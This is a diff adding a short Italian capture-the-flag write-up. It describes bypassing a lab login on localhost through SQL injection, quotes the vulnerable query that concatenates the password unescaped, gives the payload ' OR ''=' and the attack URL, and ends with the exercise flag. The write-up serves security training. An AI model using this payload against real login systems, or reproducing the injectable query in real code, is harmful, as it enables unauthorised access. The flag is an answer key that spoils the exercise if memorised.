@@ -1,0 +1,34 @@
+
+Lo scopo è fare saltare il sistema di login, l'utente è data (admin), le opzioni sono due:
+- o si trova la psw di admin
+- o si forza il sistema di login a farci passare lo stesso anche se non sappiamo la password
+E' stata seguita la seconda strada.
+
+
+
+Inserendo un apicetto nel link come di seguito:
+http://localhost:8000/login?username=&password='
+
+Si ha il seguente suggerimento per risolvere l'esercizio:
+cursor.execute("SELECT * FROM users WHERE username='" + re.sub(r"[^\w]", "", params.get("username", "")) + "' AND password='" + params.get("password", "") + "'")
+
+Il login ha successo se la query SQL ha successo.
+
+Di conseguenza, andando ad inserire come password:
+OR ''=' 
+è possibile rendere true sempre la condizione della query SQL ed effettuare con successo il login.
+
+Si invoca quindi il seguente URL:
+http://localhost:8000/login?username=admin&password=' OR ''='
+
+Si può notare che si viene subito rediretti a un'altra pagina.
+Per vedere nella response la flag si possono usare strumenti:
+Burp, Inspect Element di Firefox, o lo scaricamento della pagina con curl/wget
+
+
+FLAG: 
+
+SEC{Login_Bypass_Always_Escape_Your_Character_Come_se_fosse_antani_need_a_longer_query}
+
+
+
